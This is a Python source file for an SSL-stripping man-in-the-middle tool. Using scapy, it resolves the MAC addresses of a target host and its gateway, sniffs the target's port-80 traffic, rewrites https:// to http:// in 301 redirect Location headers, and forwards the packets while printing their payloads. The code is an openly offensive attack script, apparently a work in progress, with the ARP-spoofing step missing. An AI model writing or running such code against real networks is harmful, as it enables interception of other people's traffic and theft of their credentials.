#!/usr/bin/env python3

import socket
import threading
import re
import ssl
import urllib.parse
from datetime import datetime
from scapy.all import sniff, TCP, IP, get_if_hwaddr, get_if_addr, Ether, sendp, srp, ARP, Raw
import sys
import signal


class SSLStripper:
    def __init__(self, interface, target_ip, gateway_ip) -> None:
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.spoofing = False
        self.forwarded_packets = set()  # Track packets we've forwarded

        self.attacker_mac = get_if_hwaddr(interface)
        self.attacker_ip = get_if_addr(interface)

        # Get MAC addresses with unlimited retries
        while True:
            self.target_mac = self.get_mac(target_ip)
            self.gateway_mac = self.get_mac(gateway_ip)

            if self.target_mac and self.gateway_mac and self.target_mac != self.attacker_mac and self.gateway_mac != self.attacker_mac:
                break

            print("[!] Retrying to get MAC addresses...")

        # Set up signal handler for graceful exit
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signum, frame):
        """Handle Ctrl+C signal"""
        print("\n[!] Interrupted by user.")
        self.stop()

    def get_mac(self, ip):
        '''
        Get the MAC address of the target or gateway
        '''
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        try:
            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except IndexError:
            print(f"[!] Could not get MAC address for {ip}")
            return None

    def start(self):
        self.spoofing = True
        print("[*] Starting SSL stripping...")
        print(f"[*] Target IP: {self.target_ip} (MAC: {self.target_mac})")
        print(f"[*] Gateway IP: {self.gateway_ip} (MAC: {self.gateway_mac})")

        try:
            while self.spoofing:
                # print("[*] Sniffing for HTTP traffic...")
                sniff(filter=f"tcp port 80",
                      prn=self.handle_packet,
                      iface=self.interface,
                      stop_filter=lambda p: not self.spoofing,
                      timeout=1)
        except Exception as e:
            print(f"[!] Error: {e}")
            self.stop()

    def stop(self):
        print("[*] Stopping SSL stripping...")
        self.spoofing = False

    def handle_packet(self, packet):
        if not packet.haslayer(TCP) or not packet.haslayer(IP):
            return

        # Create a unique identifier for this packet
        packet_id = (packet[IP].id, packet[TCP].seq)

        # Skip if we've already forwarded this packet
        if packet_id in self.forwarded_packets:
            return

        # Check if packet is from target to gateway or vice versa
        if (packet[IP].src == self.target_ip) or (packet[IP].dst == self.target_ip):

            # Create a new packet to forward
            new_packet = packet.copy()
            if packet[IP].src == self.target_ip:
                new_packet[Ether].src = self.attacker_mac
                new_packet[Ether].dst = self.gateway_mac
            else:
                new_packet[Ether].src = self.attacker_mac
                new_packet[Ether].dst = self.target_mac
            # Add payload if it exists
            if new_packet.haslayer(Raw):
                raw_payload = new_packet[Raw].load
                try:
                    raw_payload = raw_payload.decode('utf-8', errors='ignore')
                    # Check for HTTP 301 and Location header
                    if 'HTTP/1.1 301 Moved Permanently' in raw_payload.splitlines()[0]:
                        # Replace https with http in Location header
                        new_payload = re.sub(
                            r'https://[^\r\n]+',
                            lambda m: m.group(0).replace('https://', 'http://') + ' ',
                            raw_payload
                        )
                        new_packet[Raw] = Raw(load=new_payload.encode())
                        print("[*] Modified 301 Location header (https -> http)")
                    print(f"[*] Payload: {raw_payload}...")
                except Exception as e:
                    print("[*] Binary payload", e)
                    new_packet[Raw] = Raw(load=raw_payload)

            # Mark this packet as forwarded
            self.forwarded_packets.add(packet_id)

            # Recalculate checksums for IP and TCP layers
            del new_packet[IP].chksum
            del new_packet[TCP].chksum
            new_packet[IP].chksum = None
            new_packet[TCP].chksum = None

            if Raw in new_packet:
                print(f"[*] Forwarding packet with payload: {new_packet[Raw].load.decode('utf-8', errors='ignore')}")

            sendp(new_packet, iface=self.interface, verbose=False)
            return


if __name__ == "__main__":
    # Example usage
    interface = "en0"  # Change this to your network interface
    target_ip = "192.168.0.186"  # Change this to your target's IP
    gateway_ip = "192.168.0.1"  # Change this to your gateway's IP

    spoofer = SSLStripper(interface, target_ip, gateway_ip)
    spoofer.start()

# TODO: vi sao k forward http
# TODO: auto set rule